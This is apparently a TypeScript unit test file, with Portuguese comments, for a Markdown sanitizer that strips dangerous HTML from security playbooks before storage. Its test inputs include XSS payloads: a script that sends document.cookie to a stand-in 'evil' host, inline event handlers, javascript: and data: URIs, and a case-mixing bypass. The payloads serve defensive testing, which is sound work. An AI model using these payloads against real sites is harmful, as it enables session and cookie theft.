/**
 * markdown-sanitize.util.test.ts (unit)
 *
 * A sanitização na ESCRITA dos playbooks (CP-5). O que se prova aqui é que
 * nada perigoso chega ao banco — a segunda camada (marked + DOMPurify na
 * renderização) é testada no web.
 *
 * ⚠️ Este utilitário NÃO é um sanitizador de HTML de uso geral, e os testes
 * refletem isso: o contrato é "remove construção perigosa de um texto que
 * deveria ser Markdown e neutraliza URL que não seja https", com o DOMPurify
 * como rede de segurança depois. Testar como se fosse um sanitizador completo
 * daria uma falsa sensação de cobertura.
 *
 *   SAN-01  <script> sai com o corpo junto (o corpo é o payload)
 *   SAN-02  as outras tags ativas saem (iframe, object, embed, svg, style…)
 *   SAN-03  handler inline (onerror=, onclick=) sai, com ou sem aspas
 *   SAN-04  javascript:/vbscript:/data: em link Markdown viram "#"
 *   SAN-05  href/src perigoso em HTML residual vira "#"
 *   SAN-06  Markdown legítimo é preservado byte a byte
 *   SAN-07  bloco de código é preservado — playbook mostra exemplo de ataque
 *   SAN-08  `changed` distingue "limpei algo" de "estava limpo"
 *   SAN-09  isSafeExternalUrl: só https, com host, até 2048 chars
 *   SAN-10  entrada nula/vazia não quebra
 */

import { isSafeExternalUrl, sanitizeFields, sanitizeMarkdown } from "../../src/utils/markdown-sanitize.util";

const limpar = (s: string): string => sanitizeMarkdown(s).value;

describe("markdown-sanitize.util (CP-5)", () => {
  it("SAN-01 remove <script> junto com o corpo", () => {
    const saida = limpar("Antes\n<script>fetch('https://evil/'+document.cookie)</script>\nDepois");
    expect(saida).not.toMatch(/<script/i);
    expect(saida).not.toContain("document.cookie");
    expect(saida).toContain("Antes");
    expect(saida).toContain("Depois");
  });

  it("SAN-02 remove as demais tags ativas", () => {
    for (const tag of ["iframe", "object", "embed", "style", "svg", "form", "link", "meta", "base"]) {
      const saida = limpar(`x <${tag} src="https://evil/">conteudo</${tag}> y`);
      expect(saida).not.toMatch(new RegExp(`<${tag}`, "i"));
      expect(saida).toContain("x");
      expect(saida).toContain("y");
    }
  });

  it("SAN-03 remove handler inline com ou sem aspas", () => {
    for (const payload of [
      '<img src="x" onerror="alert(1)">',
      "<img src=x onerror=alert(1)>",
      "<div onclick='roubar()'>oi</div>",
      '<b ONMOUSEOVER="x">oi</b>',
    ]) {
      const saida = limpar(payload);
      expect(saida.toLowerCase()).not.toMatch(/\son[a-z]+\s*=/);
    }
  });

  it("SAN-04 neutraliza URL perigosa em link Markdown", () => {
    expect(limpar("[clique](javascript:alert(1))")).toBe("[clique](#)");
    expect(limpar("[clique](vbscript:msgbox)")).toBe("[clique](#)");
    expect(limpar("[clique](data:text/html;base64,PHNjcmlwdD4=)")).toBe("[clique](#)");
    // JAVASCRIPT: com caixa alternada e espaço é a variação clássica de bypass.
    expect(limpar("[clique](JaVaScRiPt:alert(1))")).toBe("[clique](#)");
    // https legítimo e imagem embutida legítima continuam intactos.
    expect(limpar("[docs](https://owasp.org/x)")).toBe("[docs](https://owasp.org/x)");
    expect(limpar("![img](data:image/png;base64,iVBORw0KG)")).toContain("data:image/png");
  });

  it("SAN-05 neutraliza href/src perigoso em HTML residual", () => {
    expect(limpar('<a href="javascript:alert(1)">x</a>')).toContain('href="#"');
    expect(limpar("<a href='javascript:alert(1)'>x</a>")).toContain('href="#"');
    expect(limpar('<img src="data:text/html,<script>">')).toContain('src="#"');
    expect(limpar('<a href="https://owasp.org">x</a>')).toContain("https://owasp.org");
  });

  it("SAN-06 preserva Markdown legítimo byte a byte", () => {
    const markdown = [
      "## Como Prevenir",
      "",
      "- Use **consultas parametrizadas**;",
      "- valide a entrada no _servidor_;",
      "- veja o [OWASP ASVS](https://owasp.org/asvs).",
      "",
      "> Nota: 1 < 2 && 3 > 2",
      "",
      "| Controle | Camada |",
      "| --- | --- |",
      "| WAF | Borda |",
    ].join("\n");
    const r = sanitizeMarkdown(markdown);
    expect(r.value).toBe(markdown);
    expect(r.changed).toBe(false);
  });

  it("SAN-07 preserva bloco de código — o playbook precisa mostrar o ataque", () => {
    // Um playbook de XSS que não pode escrever <script> no exemplo é inútil.
    const markdown = [
      "Exemplo do payload:",
      "",
      "```html",
      '<script>alert(document.cookie)</script>',
      '<img src=x onerror=alert(1)>',
      "```",
      "",
      "E inline: `<iframe src=evil>`.",
    ].join("\n");
    const r = sanitizeMarkdown(markdown);
    expect(r.value).toBe(markdown);
    expect(r.value).toContain("<script>alert(document.cookie)</script>");
    expect(r.value).toContain("`<iframe src=evil>`");
    expect(r.changed).toBe(false);
  });

  it("SAN-08 changed distingue limpeza de conteúdo já limpo", () => {
    expect(sanitizeMarkdown("texto puro").changed).toBe(false);
    expect(sanitizeMarkdown("<script>x</script>").changed).toBe(true);

    const campos = sanitizeFields({ a: "limpo", b: "<script>x</script>", c: null });
    expect(campos.changed).toBe(true);
    expect(campos.values.a).toBe("limpo");
    expect(campos.values.c).toBeNull();
    // Campo que vira vazio depois da limpeza é null, não string vazia.
    expect(campos.values.b).toBeNull();
    expect(sanitizeFields({ a: "limpo" }).changed).toBe(false);
  });

  it("SAN-09 isSafeExternalUrl aceita só https com host", () => {
    expect(isSafeExternalUrl("https://owasp.org/x")).toBe(true);
    expect(isSafeExternalUrl("http://owasp.org/x")).toBe(false);
    expect(isSafeExternalUrl("javascript:alert(1)")).toBe(false);
    expect(isSafeExternalUrl("data:text/html,x")).toBe(false);
    expect(isSafeExternalUrl("/relativo")).toBe(false);
    expect(isSafeExternalUrl("")).toBe(false);
    expect(isSafeExternalUrl(`https://owasp.org/${"a".repeat(2100)}`)).toBe(false);
    expect(isSafeExternalUrl(null as unknown as string)).toBe(false);
  });

  it("SAN-10 entrada nula ou vazia não quebra", () => {
    expect(sanitizeMarkdown(null)).toEqual({ value: "", changed: false });
    expect(sanitizeMarkdown(undefined)).toEqual({ value: "", changed: false });
    expect(sanitizeMarkdown("")).toEqual({ value: "", changed: false });
  });
});
